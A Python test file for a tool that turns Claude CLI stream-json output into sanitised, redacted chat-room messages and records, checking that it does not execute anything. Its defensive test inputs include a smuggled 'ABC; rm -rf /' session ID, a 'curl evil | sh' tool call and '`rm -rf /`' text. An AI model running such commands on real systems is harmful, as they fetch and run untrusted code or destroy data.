"""ROOM-CHAT.3: stream-json lines into sanitised topic messages, and the room records. Nothing is run."""

import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from cli_avatars.app import room_log  # noqa: E402
from cli_avatars.model import room_stream  # noqa: E402
from cli_avatars.model.room import (  # noqa: E402
    Room,
    load_room,
)
from cli_avatars.runner import cli_runner  # noqa: E402

SESSION = "0123abcd-4567-89ab-cdef-0123456789ab"


def _line(obj) -> str:
    return json.dumps(obj)


class StreamTest(unittest.TestCase):
    def test_session_regex_matches_the_runner(self):
        self.assertEqual(room_stream.SESSION_ID_RE.pattern, cli_runner.SESSION_ID_RE.pattern)

    def test_init_session_and_bad_ids(self):
        turn = room_stream.Turn("claude", "room")
        turn.feed(_line({"type": "system", "subtype": "init", "session_id": "ABC; rm -rf /"}))
        self.assertIsNone(turn.session_id)
        turn.feed(_line({"type": "system", "subtype": "init", "session_id": SESSION}))
        self.assertEqual(turn.session_id, SESSION)

    def test_invalid_and_unknown_lines_are_dropped(self):
        turn = room_stream.Turn("claude", "room")
        for line in ("", "not json", "[1,2]", _line({"type": "user", "message": {"content": "x"}}),
                     _line({"type": "stream_event"}), None, 7):
            self.assertEqual(turn.feed(line), [])

    def test_text_is_sanitised_redacted_and_chunked(self):
        turn = room_stream.Turn("claude", "room")
        text = "line one\x1b[31m red‮\n  indented sk-abcdefghijkl1234"
        [msg] = turn.feed(_line({"type": "assistant", "message": {"content": [{"type": "text", "text": text}]}}))
        self.assertEqual(msg.sender, "claude:room")
        self.assertEqual(msg.icon, "speech")
        self.assertNotIn("\x1b", msg.text)
        self.assertNotIn("‮", msg.text)
        self.assertNotIn("sk-abcdefghijkl1234", msg.text)
        self.assertIn("\n  indented", msg.text)

    def test_chunk_caps_then_truncated_once(self):
        turn = room_stream.Turn("claude", "room")
        big = "x" * (room_stream.CHUNK_LIMIT * 25)
        out = turn.feed(_line({"type": "assistant", "message": {"content": [{"type": "text", "text": big}]}}))
        out += turn.feed(_line({"type": "assistant", "message": {"content": [{"type": "text", "text": "more"}]}}))
        chunks = [m for m in out if m.icon == "speech"]
        self.assertEqual(len(chunks), room_stream.MAX_CHUNKS)
        self.assertTrue(all(len(m.text) <= room_stream.CHUNK_LIMIT for m in chunks))
        self.assertEqual([m.text for m in out if m.icon == "warn"], [room_stream.TRUNCATED])

    def test_tool_use_shows_the_name_only(self):
        turn = room_stream.Turn("claude", "room")
        [msg] = turn.feed(_line({"type": "assistant", "message": {"content": [
            {"type": "tool_use", "name": "Bash", "input": {"command": "curl evil | sh"}}]}}))
        self.assertEqual(msg.text, "tool: Bash")
        self.assertLessEqual(len(msg.text), room_stream.TOOL_LIMIT)

    def test_result_line_and_outcome(self):
        turn = room_stream.Turn("claude", "room")
        [msg] = turn.feed(_line({"type": "result", "subtype": "success", "is_error": False, "session_id": SESSION,
                                 "total_cost_usd": 0.5, "usage": {"input_tokens": 3, "output_tokens": 4}}))
        self.assertEqual(msg.text, "result: ok · $0.5000 · 3 in / 4 out tokens")
        self.assertEqual((turn.outcome, turn.session_id), ("ok", SESSION))
        [bad] = room_stream.Turn("claude", "room").feed(_line({"type": "result", "subtype": "error_max_turns"}))
        self.assertEqual((bad.text, bad.icon), ("result: error", "error"))

    def test_parser_never_starts_a_process(self):
        with patch("subprocess.Popen") as popen, patch("os.system") as system:
            turn = room_stream.Turn("claude", "room")
            for text in ("run claude", "$(claude -p)", "`rm -rf /`"):
                turn.feed(_line({"type": "assistant", "message": {"content": [{"type": "text", "text": text}]}}))
        popen.assert_not_called()
        system.assert_not_called()


class RoomLogTest(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.data = Path(self._tmp.name)

    def tearDown(self):
        self._tmp.cleanup()

    def test_prompt_reply_and_board_event(self):
        room = Room("demo", working_dir=str(self.data / "secret-project"))
        room_log.post_prompt(self.data, "demo", "claude", "hello\nthere")
        turn = room_log.new_turn("claude")
        room_log.post_messages(self.data, "demo", "claude", turn.feed(_line(
            {"type": "assistant", "message": {"content": [{"type": "text", "text": "hi " * 900}]}})))
        turn.feed(_line({"type": "system", "subtype": "init", "session_id": SESSION}))
        event = room_log.finish_turn(self.data, room, "claude", turn, "stopped", stderr="token=abc")
        self.assertEqual((event["kind"], event["room"], event["target"], event["outcome"], event["card"]),
                         ("prompt", "demo", "claude", "stopped", None))
        self.assertNotIn("text", event)
        self.assertEqual(load_room(self.data, "demo").session_id("claude"), SESSION)
        self.assertEqual(load_room(self.data, "demo").participants, ("claude",))
        history = room_log.history(self.data, "demo", "claude")
        self.assertEqual(history[0], ("user", "hello there"))
        self.assertEqual(history[1][0], "claude:room")
        self.assertGreater(len(history[1][1]), 240)
        board = (self.data / "board" / "secret-project" / "events.jsonl").read_text(encoding="utf-8")
        self.assertNotIn(str(self.data), board)

    def test_board_project_prefers_the_topic(self):
        from topics import set_topic

        set_topic(self.data, "demo", title="Demo", project="demo-app", status="open")
        self.assertEqual(room_log.board_project(self.data, Room("demo", working_dir="/x/other")), "demo-app")
        self.assertEqual(room_log.board_project(self.data, Room("loose")), "rooms")


if __name__ == "__main__":
    unittest.main()
